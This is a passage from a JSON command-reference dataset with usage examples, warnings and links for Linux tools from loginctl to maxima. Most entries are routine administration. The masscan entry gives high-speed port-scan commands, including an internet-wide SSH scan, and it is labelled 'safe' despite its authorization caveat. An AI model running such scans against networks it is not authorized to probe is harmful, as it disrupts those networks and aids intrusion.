    "description": "Control systemd login manager for user sessions",
    "examples": [
      "loginctl list-sessions  # Show all active user sessions",
      "loginctl show-session 1  # Display detailed information about session 1",
      "sudo loginctl terminate-user username  # End all sessions for specified user",
      "sudo loginctl kill-session 2  # Forcefully terminate session 2",
      "loginctl lock-sessions  # Lock all active user sessions",
      "loginctl list-users  # Show all users with active sessions",
      "loginctl user-status $USER && loginctl session-status $(loginctl show-user $USER -p Sessions --value) && loginctl show-session $(loginctl show-user $USER -p Sessions --value) -p State,Type,Remote --value  # Show comprehensive user session information including status, type, and remote connection details"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "loginctl [options] <command> [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "User session management",
        "commands": "loginctl list-sessions | grep username && sudo loginctl terminate-user username",
        "explanation": "Find user sessions then terminate them",
        "title": "loginctl | grep && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "who",
        "relationship": "similar",
        "reason": "Both show logged in users"
      }
    ],
    "warnings": [
      "Terminating sessions may cause data loss",
      "Some operations require root privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.freedesktop.org/software/systemd/man/loginctl.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "logrotate",
    "subtitle": "Log Rotate",
    "description": "Automatically rotate, compress, and manage log files",
    "examples": [
      "sudo logrotate /etc/logrotate.conf  # Execute log rotation based on system configuration",
      "logrotate -d /etc/logrotate.conf  # Show what logrotate would do without actually doing it",
      "sudo logrotate -f /etc/logrotate.conf  # Force rotation even if conditions aren't met",
      "sudo logrotate -v /etc/logrotate.conf  # Run with detailed output showing actions taken",
      "logrotate -s /var/lib/logrotate.status /etc/logrotate.d/myapp  # Rotate specific application logs with custom state file",
      "echo '/var/log/myapp/*.log {\n    daily\n    rotate 30\n    compress\n    delaycompress\n    missingok\n    notifempty\n    postrotate\n        systemctl reload myapp || true\n    endscript\n}' | sudo tee /etc/logrotate.d/myapp && sudo logrotate -f /etc/logrotate.d/myapp  # Create custom logrotate configuration for application with service reload and force rotation"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "logrotate [options] config-file",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Manual log maintenance",
        "commands": "sudo logrotate -f /etc/logrotate.conf && sudo systemctl reload rsyslog",
        "explanation": "Force log rotation and reload syslog service",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "cron",
        "relationship": "combo",
        "reason": "logrotate is typically run by cron on schedule"
      },
      {
        "name": "gzip",
        "relationship": "combo",
        "reason": "logrotate often uses gzip to compress rotated logs"
      }
    ],
    "warnings": [
      "Configuration files in /etc/logrotate.d/ for specific applications",
      "State file tracks last rotation times",
      "Can execute pre/post rotation scripts"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/logrotate.8.html"
      },
      {
        "platform": "macos",
        "url": "Not typically available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "logstash",
    "subtitle": "Logstash Data Pipeline",
    "description": "Data processing pipeline for ingesting and transforming log data",
    "examples": [
      "logstash -f logstash.conf  # Run Logstash with specific configuration file",
      "logstash -f logstash.conf --config.test_and_exit  # Test configuration syntax and exit",
      "logstash -f logstash.conf --config.reload.automatic  # Automatically reload configuration on changes",
      "logstash --path.settings /path/to/settings  # Use custom settings directory",
      "logstash -f pipeline.conf --pipeline.workers=4 --pipeline.batch.size=1000 --config.reload.automatic=true --log.level=info --path.logs=/var/log/logstash && curl -X GET 'localhost:9600/_node/stats/pipeline'  # Start production Logstash with performance tuning and monitor pipeline statistics via API"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "logstash [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development with auto-reload",
        "commands": "logstash -f pipeline.conf --config.reload.automatic --log.level=debug",
        "explanation": "Development setup with debug logging and auto-reload",
        "title": "logstash"
      }
    ],
    "relatedCommands": [
      {
        "name": "elasticsearch",
        "relationship": "combo",
        "reason": "Logstash commonly outputs to Elasticsearch"
      },
      {
        "name": "filebeat",
        "relationship": "alternative",
        "reason": "Filebeat is lightweight alternative for log shipping"
      }
    ],
    "warnings": [
      "Requires Java runtime",
      "Memory usage depends on pipeline complexity",
      "Configuration syntax is specific to Logstash"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.elastic.co/guide/en/logstash/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "logwatch",
    "subtitle": "Log Watcher",
    "description": "Log analysis and reporting tool for system security monitoring",
    "examples": [
      "logwatch --detail Med --service All --range today  # Generate medium detail report for all services today",
      "logwatch --service sshd --service pam_unix --range yesterday  # Focus on SSH and authentication logs from yesterday",
      "logwatch --detail High --range 'between -7 days and -1 days'  # High detail report for the past week",
      "logwatch --service postfix --detail High --range today  # Detailed mail server log analysis",
      "logwatch --service All --detail High --range 'between -7 days and -1 days' --format html --output /tmp/security-report.html && mutt -s 'Weekly Security Report' -a /tmp/security-report.html admin@company.com < /dev/null  # Generate comprehensive weekly security report in HTML and email to administrator"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "logwatch [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive security monitoring",
        "commands": "logwatch --service secure --service messages --detail High --range today --mailto admin@example.com",
        "explanation": "Generate security report and email to administrator",
        "title": "logwatch"
      }
    ],
    "relatedCommands": [
      {
        "name": "fail2ban",
        "relationship": "combo",
        "reason": "Automated response to log analysis findings"
      },
      {
        "name": "rsyslog",
        "relationship": "combo",
        "reason": "Log collection and forwarding"
      }
    ],
    "warnings": [
      "Configuration files can be complex",
      "May miss events between scheduled runs",
      "Requires proper log rotation configuration"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://sourceforge.net/projects/logwatch/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "loki",
    "subtitle": "Loki Log Aggregation",
    "description": "Horizontally-scalable log aggregation system inspired by Prometheus",
    "examples": [
      "loki -config.file=loki.yaml  # Start Loki with configuration file",
      "loki -verify-config -config.file=loki.yaml  # Validate Loki configuration file",
      "loki -print-config-stderr -config.file=loki.yaml  # Print parsed configuration to stderr",
      "loki -target=querier -config.file=loki.yaml  # Run Loki in specific component mode",
      "loki -config.file=loki-production.yaml -log.level=info && curl -G -s 'http://localhost:3100/loki/api/v1/query_range' --data-urlencode 'query={job=\"webapp\"}[5m]' --data-urlencode 'start=1640995200' --data-urlencode 'end=1640995800'  # Start production Loki and query recent webapp logs via HTTP API with timestamp range"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "loki [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development setup",
        "commands": "loki -config.file=loki-local.yaml & promtail -config.file=promtail.yaml",
        "explanation": "Start Loki server and Promtail agent",
        "title": "loki & promtail"
      }
    ],
    "relatedCommands": [
      {
        "name": "promtail",
        "relationship": "combo",
        "reason": "Promtail ships logs to Loki"
      },
      {
        "name": "grafana",
        "relationship": "combo",
        "reason": "Grafana visualizes Loki logs"
      }
    ],
    "warnings": [
      "Requires proper storage configuration",
      "Index period must be configured correctly",
      "Log retention settings are important"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://grafana.com/docs/loki/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ls",
    "subtitle": "list",
    "description": "List directory contents with file details and permissions",
    "examples": [
      "ls -la  # Show detailed list with hidden files, permissions, and sizes",
      "ls -lt  # Show newest files first for quick access to recent changes",
      "ls -lh  # Display file sizes in KB, MB, GB instead of bytes",
      "ls -R  # Show contents of all subdirectories in tree structure",
      "ls --color=auto  # Highlight directories, executables, and file types with colors",
      "ls -latr --time-style=long-iso | awk '{if(NR>1) print $6\" \"$7\" \"$9}' | sort -k1,2 | tail -10  # Show 10 most recently modified files with ISO timestamps for detailed change tracking"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "ls [options] [directory]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find largest files in directory",
        "commands": "ls -la | sort -k5 -nr | head -10",
        "explanation": "List files, sort by size (column 5), show 10 largest",
        "title": "ls | sort | head"
      },
      {
        "scenario": "Count files in directory",
        "commands": "ls -1 | wc -l",
        "explanation": "List one file per line and count total number",
        "title": "ls | wc"
      }
    ],
    "relatedCommands": [
      {
        "name": "exa",
        "relationship": "alternative",
        "reason": "Modern replacement with better colors and Git integration"
      },
      {
        "name": "tree",
        "relationship": "similar",
        "reason": "Better visualization for directory structure"
      },
      {
        "name": "find",
        "relationship": "powerful",
        "reason": "More advanced file searching and filtering capabilities"
      }
    ],
    "warnings": [
      "Hidden files (starting with .) are not shown by default",
      "ls -l shows permissions in cryptic format (rwxrwxrwx)",
      "File sizes default to bytes, use -h for human-readable"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ls.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ls.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/ls-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "lsblk",
    "subtitle": "list block devices",
    "description": "List block devices in tree format",
    "examples": [
      "lsblk  # Display all block devices in tree format with mount points",
      "lsblk -f  # Include filesystem type, labels, and UUIDs",
      "lsblk -h  # Show sizes in KB, MB, GB instead of bytes",
      "lsblk /dev/sda  # Show partition layout for specific disk",
      "lsblk -J  # Machine-readable JSON output for scripts",
      "lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE,UUID | grep -E 'part|disk' | awk '$3==\"part\" && $4==\"\" {print $1, $2, $5, $6}' | column -t  # Display unmounted partitions with filesystem type and UUID for mounting or maintenance planning"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "lsblk [options] [device]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find unmounted filesystems",
        "commands": "lsblk -f | grep -v '/$\\|\\[SWAP\\]' | awk '$4 == \"\" {print $1}'",
        "explanation": "Identify block devices that are not currently mounted",
        "title": "lsblk | grep | | awk"
      },
      {
        "scenario": "Check disk usage with partition info",
        "commands": "lsblk && echo '---' && df -h",
        "explanation": "Show block device layout followed by filesystem usage",
        "title": "lsblk && echo && df"
      }
    ],
    "relatedCommands": [
      {
        "name": "fdisk",
        "relationship": "powerful",
        "reason": "More detailed disk partitioning information"
      },
      {
        "name": "df",
        "relationship": "combo",
        "reason": "Shows filesystem usage for mounted devices"
      },
      {
        "name": "mount",
        "relationship": "combo",
        "reason": "Mount/unmount block devices shown by lsblk"
      }
    ],
    "warnings": [
      "Linux-specific command, not available on other systems",
      "Some information requires root privileges",
      "Tree format may be confusing for complex disk layouts"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/lsblk.8.html"
      },
      {
        "platform": "generic",
        "url": "https://github.com/karelzak/util-linux"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lscpu",
    "subtitle": "list CPU",
    "description": "Display detailed CPU architecture information",
    "examples": [
      "lscpu  # Show detailed CPU architecture, cores, threads, and cache info",
      "lscpu | grep -i vuln  # Display CPU security vulnerability mitigations",
      "lscpu -p  # Display CPU topology in parseable format",
      "lscpu -J  # Generate machine-readable JSON output",
      "lscpu | awk '/^CPU\(s\):|^Thread\(s\):|^CPU MHz:|^Model name:/ {print}' && cat /proc/meminfo | awk '/MemTotal|MemAvailable/ {print}' && echo \"Performance Scaling:\" && cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null || echo 'Not available'  # Create comprehensive system profile for performance tuning including CPU specs, memory, and power management"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "lscpu [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CPU info for system inventory",
        "commands": "echo 'CPU Info:' && lscpu | grep -E 'Model name|CPU\\(s\\)|Thread'",
        "explanation": "Extract key CPU details for documentation",
        "title": "echo && lscpu | grep | CPU | Thread"
      },
      {
        "scenario": "Check if hyperthreading is enabled",
        "commands": "lscpu | awk '/^CPU\\(s\\):/ {cpu=$2} /^Thread/ {thread=$4} END {if(cpu/thread > 1) print \"Hyperthreading: Enabled\"; else print \"Hyperthreading: Disabled\"}'",
        "explanation": "Determine hyperthreading status from CPU topology",
        "title": "lscpu | awk > 1 ; else"
      }
    ],
    "relatedCommands": [
      {
        "name": "cat /proc/cpuinfo",
        "relationship": "similar",
        "reason": "Raw CPU information from /proc filesystem"
      },
      {
        "name": "nproc",
        "relationship": "simple",
        "reason": "Just shows number of processing units"
      },
      {
        "name": "lshw",
        "relationship": "comprehensive",
        "reason": "Complete hardware information including CPU"
      }
    ],
    "warnings": [
      "Linux-specific command, not available on macOS",
      "Some fields may require root privileges to display",
      "Output format may vary between different Linux distributions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/lscpu.1.html"
      },
      {
        "platform": "generic",
        "url": "https://github.com/karelzak/util-linux"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lsof",
    "subtitle": "List Open Files",
    "description": "List open files and network connections",
    "examples": [
      "lsof -p 1234  # Show all files opened by process ID 1234",
      "lsof /var/log/syslog  # Show which processes have syslog file open",
      "lsof -i  # Show all network connections",
      "lsof -i :80  # Show which process is using port 80",
      "lsof -u username  # Show all files opened by specific user",
      "lsof +D /var/www/  # Show processes accessing files in directory recursively",
      "lsof -i -P -n | grep -E '(LISTEN|ESTABLISHED)' | sort -k1,1 -k9,9 | awk '{print $1, $3, $8, $9}' | column -t  # Show detailed network connections by process with numeric ports, sorted and formatted for security analysis"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "lsof [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web server troubleshooting",
        "commands": "lsof -i :80 && lsof -i :443 && lsof -u www-data",
        "explanation": "Check HTTP/HTTPS port usage and web server user files",
        "title": "lsof && lsof && lsof"
      }
    ],
    "relatedCommands": [
      {
        "name": "netstat",
        "relationship": "similar",
        "reason": "Both show network connections"
      },
      {
        "name": "fuser",
        "relationship": "similar",
        "reason": "Show processes using files"
      }
    ],
    "warnings": [
      "Output can be very verbose",
      "Some information requires root privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/lsof.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ltrace",
    "subtitle": "Library Trace",
    "description": "Trace library calls made by programs",
    "examples": [
      "ltrace ./myprogram  # Trace all library function calls made by program",
      "ltrace -e malloc,free ./myprogram  # Trace only malloc and free function calls",
      "ltrace -T ./myprogram  # Display time spent in each library call",
      "ltrace -o trace.log ./myprogram  # Save library call trace to file",
      "ltrace -c ./myprogram  # Show summary count of library function calls",
      "ltrace -e 'malloc+calloc+realloc+free' -f -p $(pgrep myapp) -o /tmp/memory-trace.log && awk '/malloc\\(|calloc\\(/ {malloc++} /free\\(/ {free++} END {printf \"Malloc calls: %d, Free calls: %d, Potential leaks: %d\\n\", malloc, free, malloc-free}' /tmp/memory-trace.log  # Trace memory allocation patterns in running process and analyze for potential leaks"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ltrace [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Debug memory issues",
        "commands": "ltrace -e malloc,calloc,realloc,free ./myprogram",
        "explanation": "Trace memory allocation and deallocation functions",
        "title": "ltrace"
      }
    ],
    "relatedCommands": [
      {
        "name": "strace",
        "relationship": "complementary",
        "reason": "strace traces system calls, ltrace traces library calls"
      },
      {
        "name": "gdb",
        "relationship": "complementary",
        "reason": "gdb provides interactive debugging capabilities"
      }
    ],
    "warnings": [
      "Works only with dynamically linked programs",
      "May miss statically linked functions",
      "Output can be overwhelming for complex programs"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ltrace.1.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lvm",
    "subtitle": "Logical Volume Manager",
    "description": "Logical Volume Manager for flexible disk storage management",
    "examples": [
      "sudo pvcreate /dev/sdb  # Initialize disk /dev/sdb as LVM physical volume",
      "sudo vgcreate vg_data /dev/sdb /dev/sdc  # Create volume group from two physical volumes",
      "sudo lvcreate -L 10G -n lv_web vg_data  # Create 10GB logical volume named lv_web",
      "sudo lvextend -L +5G /dev/vg_data/lv_web  # Extend logical volume by additional 5GB",
      "sudo vgdisplay vg_data  # Show detailed information about volume group",
      "sudo lvcreate -L 1G -s -n lv_web_snap /dev/vg_data/lv_web  # Create 1GB snapshot of logical volume",
      "sudo lvcreate -L 100G -n lv_database vg_data && sudo mkfs.ext4 -j -E lazy_itable_init=0,lazy_journal_init=0 /dev/vg_data/lv_database && sudo mount /dev/vg_data/lv_database /var/lib/mysql && sudo systemctl restart mysql && sudo lvdisplay vg_data/lv_database  # Create optimized database volume with immediate initialization, mount for MySQL, restart service, and verify configuration"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "lvm command [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete LVM setup",
        "commands": "sudo pvcreate /dev/sdb && sudo vgcreate vg_data /dev/sdb && sudo lvcreate -L 10G -n lv_web vg_data && sudo mkfs.ext4 /dev/vg_data/lv_web",
        "explanation": "Create PV, VG, LV, and format with filesystem",
        "title": "sudo && sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "fdisk",
        "relationship": "combo",
        "reason": "Partition disks before LVM"
      },
      {
        "name": "mkfs",
        "relationship": "combo",
        "reason": "Format LVM logical volumes"
      }
    ],
    "warnings": [
      "Always backup data before LVM operations",
      "Extend filesystem after extending logical volume"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/lvm.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lynis",
    "subtitle": "Lynis",
    "description": "System hardening and compliance auditing tool",
    "examples": [
      "lynis audit system  # Perform comprehensive system security audit",
      "lynis audit system --quick  # Run abbreviated security assessment",
      "lynis audit system --verbose --log-file /tmp/lynis.log  # Create detailed audit log with verbose output",
      "lynis show tests  # Display all available security tests",
      "lynis audit system --pentest --forensics --quick --log-file /var/log/lynis-$(date +%Y%m%d).log --report-file /tmp/lynis-report-$(date +%Y%m%d).dat && awk '/Warning|Suggestion/ {print}' /var/log/lynis-$(date +%Y%m%d).log | mail -s 'Security Audit Results' security-team@company.com  # Comprehensive security audit with penetration testing focus, forensics mode, generate timestamped reports, and email critical findings to security team"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "lynis [mode] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete security assessment with reporting",
        "commands": "lynis audit system --verbose && lynis show report",
        "explanation": "Run audit and display summary report",
        "title": "lynis && lynis"
      }
    ],
    "relatedCommands": [
      {
        "name": "chkrootkit",
        "relationship": "similar",
        "reason": "System security scanning tool"
      },
      {
        "name": "rkhunter",
        "relationship": "similar",
        "reason": "Rootkit detection and system hardening"
      }
    ],
    "warnings": [
      "Some tests require root privileges",
      "Results may include false positives",
      "Regular updates recommended for current threat detection"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://cisofy.com/lynis/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lz4",
    "subtitle": "LZ4 compression",
    "description": "Extremely fast compression focusing on speed",
    "examples": [
      "lz4 file.txt file.txt.lz4  # Compress file with extreme speed",
      "lz4 -d file.txt.lz4 file.txt  # Decompress lz4 file",
      "lz4 -9 file.txt file.txt.lz4  # Use maximum compression level",
      "lz4 -b file.txt  # Benchmark compression performance on file",
      "lz4 -c file.txt > output.lz4  # Compress to stdout for piping",
      "tar -c directory/ | lz4 > archive.tar.lz4  # Compress tar stream with lz4",
      "lz4 -f input.txt existing.lz4  # Force overwrite existing compressed file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "lz4 [options] [input] [output]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Real-time data compression",
        "commands": "some_data_generator | lz4 -c > compressed_stream.lz4",
        "explanation": "Compress streaming data in real-time",
        "title": "some_data_generator | lz4 > compressed_stream"
      }
    ],
    "relatedCommands": [
      {
        "name": "zstd",
        "relationship": "similar",
        "reason": "Both are modern fast compression algorithms"
      },
      {
        "name": "lzop",
        "relationship": "similar",
        "reason": "Both prioritize speed over compression ratio"
      }
    ],
    "warnings": [
      "Prioritizes speed over compression ratio",
      "Great for real-time applications"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://lz4.github.io/lz4/"
      },
      {
        "platform": "macos",
        "url": "https://lz4.github.io/lz4/"
      },
      {
        "platform": "windows",
        "url": "https://lz4.github.io/lz4/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lzop",
    "subtitle": "Lempel-Ziv-Oberhumer Packer",
    "description": "Fast compression utility optimized for speed",
    "examples": [
      "lzop file.txt  # Quickly compress file.txt to file.txt.lzo",
      "lzop -d file.txt.lzo  # Decompress file.txt.lzo to file.txt",
      "lzop -k file.txt  # Compress while keeping original file",
      "lzop -1 largefile.dat  # Use fastest compression level",
      "lzop -9 document.pdf  # Use maximum compression level",
      "lzop -t backup.lzo  # Test integrity of compressed file",
      "lzop -v *.txt  # Compress all text files with verbose output"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "lzop [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fast backup compression",
        "commands": "tar -c directory/ | lzop > backup.tar.lzo",
        "explanation": "Create quickly compressed backup",
        "title": "tar | lzop > backup"
      }
    ],
    "relatedCommands": [
      {
        "name": "gzip",
        "relationship": "alternative",
        "reason": "gzip provides better compression, lzop is faster"
      }
    ],
    "warnings": [
      "Optimized for speed over compression ratio",
      "Not as widely available as gzip/bzip2"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.lzop.org/"
      },
      {
        "platform": "macos",
        "url": "https://www.lzop.org/"
      },
      {
        "platform": "windows",
        "url": "https://www.lzop.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "make",
    "subtitle": "make",
    "description": "Build automation tool using Makefiles",
    "examples": [
      "make  # Execute first target in Makefile (usually 'all')",
      "make install  # Execute 'install' target from Makefile",
      "make clean  # Remove compiled files and build artifacts",
      "make -j4  # Use 4 parallel jobs to speed up compilation",
      "make -n  # Show commands that would be executed without running them",
      "make -f custom.mk  # Use custom.mk instead of default Makefile",
      "make CC=clang CFLAGS=-O3  # Set compiler and optimization flags for build"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "make [options] [target]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete build and install",
        "commands": "make clean && make -j$(nproc) && sudo make install",
        "explanation": "Clean, build with all CPU cores, then install",
        "title": "make && make && sudo"
      },
      {
        "scenario": "Debug build process",
        "commands": "make -n > build_plan.txt && make -j4",
        "explanation": "Generate build plan then execute parallel build",
        "title": "make > build_plan && make"
      }
    ],
    "relatedCommands": [
      {
        "name": "cmake",
        "relationship": "alternative",
        "reason": "Modern build system generator that creates Makefiles"
      },
      {
        "name": "gcc",
        "relationship": "combo",
        "reason": "make often orchestrates gcc compilation commands"
      },
      {
        "name": "ninja",
        "relationship": "alternative",
        "reason": "Faster build tool alternative to make"
      }
    ],
    "warnings": [
      "Makefile must use tabs, not spaces for indentation",
      "Parallel builds can fail with poorly written Makefiles",
      "Variables and target dependencies can be complex"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/make/manual/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/make/manual/"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/make/manual/"
      },
      {
        "platform": "generic",
        "url": "https://makefiletutorial.com/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL, MinGW, or MSYS2"
    }
  },
  {
    "name": "masscan",
    "subtitle": "Mass Scanner",
    "description": "High-speed port scanner for large-scale network assessment",
    "examples": [
      "masscan 192.168.1.0/24 -p80,443 --rate=1000  # Scan web ports on local network at 1000 packets/second",
      "masscan 0.0.0.0/0 -p22 --rate=100 --exclude 255.255.255.255  # Scan SSH port globally (use with extreme caution and authorization)",
      "masscan 10.0.0.0/8 -p1-65535 --rate=10000 -oX scan_results.xml  # Comprehensive port scan with XML output",
      "masscan --resume paused.conf  # Continue previously paused scan"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "masscan [options] <IP-ranges> -p <ports>",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Two-stage network assessment",
        "commands": "masscan 192.168.0.0/16 -p80,443,22,21 --rate=1000 -oG quick_scan.txt && nmap -sV -iL <(grep open quick_scan.txt | cut -d' ' -f2)",
        "explanation": "Fast discovery followed by detailed service scanning",
        "title": "masscan && nmap < | cut"
      }
    ],
    "relatedCommands": [
      {
        "name": "nmap",
        "relationship": "combo",
        "reason": "Use nmap for detailed analysis of masscan results"
      },
      {
        "name": "zmap",
        "relationship": "similar",
        "reason": "Alternative high-speed network scanner"
      }
    ],
    "warnings": [
      "Can overwhelm networks and trigger security alerts",
      "Requires proper authorization for large-scale scanning",
      "Rate limiting important to avoid network disruption"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/robertdavidgraham/masscan"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "maven",
    "subtitle": "Maven",
    "description": "Project management and comprehension tool for Java projects",
    "examples": [
      "mvn compile  # Compile source code",
      "mvn test  # Run unit tests",
      "mvn package  # Create JAR/WAR file",
      "mvn clean install  # Clean project and install to local repository",
      "mvn archetype:generate -DgroupId=com.example -DartifactId=myapp  # Generate new Maven project from archetype",
      "mvn dependency:tree  # Display project dependency tree",
      "mvn exec:java -Dexec.mainClass=com.example.App  # Execute Java main class"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mvn [options] [goals]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full CI/CD pipeline",
        "commands": "mvn clean compile test package install deploy",
        "explanation": "Complete Maven lifecycle for continuous deployment",
        "title": "mvn"
      }
    ],
    "relatedCommands": [
      {
        "name": "gradle",
        "relationship": "alternative",
        "reason": "Gradle is more flexible alternative to Maven"
      },
      {
        "name": "ant",
        "relationship": "predecessor",
        "reason": "Ant was used before Maven became popular"
      }
    ],
    "warnings": [
      "Uses pom.xml for project configuration",
      "Follows convention over configuration principle",
      "Strong dependency management capabilities"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://maven.apache.org/guides/"
      },
      {
        "platform": "macos",
        "url": "https://maven.apache.org/guides/"
      },
      {
        "platform": "windows",
        "url": "https://maven.apache.org/guides/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "maxima",
    "subtitle": "Maxima",
    "description": "Computer algebra system for symbolic mathematics",
    "examples": [
      "maxima  # Launch Maxima computer algebra system",
      "maxima -b script.max  # Execute Maxima batch file",
      "maxima -r \"integrate(x^2, x);\"  # Compute symbolic integral of x squared",
      "maxima -r \"solve(x^2 + x - 1 = 0, x);\"  # Solve quadratic equation symbolically",
      "maxima -r \"plot2d(sin(x), [x, -2*%pi, 2*%pi]);\"  # Plot sine function over specified range"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "maxima [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Symbolic mathematics workflow",
        "commands": "maxima -r \"f: x^3 + 2*x^2 - x - 2; solve(f = 0, x); factor(f);\"",
        "explanation": "Define polynomial, find roots, and factor",
        "title": "maxima ; solve ; factor ;"
      },
      {
        "scenario": "Calculus computations",
        "commands": "maxima -r \"diff(sin(x)*cos(x), x); integrate(%, x);\"",
        "explanation": "Differentiate then integrate trigonometric function",
        "title": "maxima ; integrate ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "sage",
        "relationship": "similar",
        "reason": "Both computer algebra systems for symbolic math"
      },
      {
        "name": "octave",
        "relationship": "alternative",
        "reason": "Numerical computing vs symbolic computing"
      },
      {
        "name": "mathematica",
        "relationship": "alternative",
        "reason": "Commercial symbolic computation system"
      }
    ],
    "warnings": [
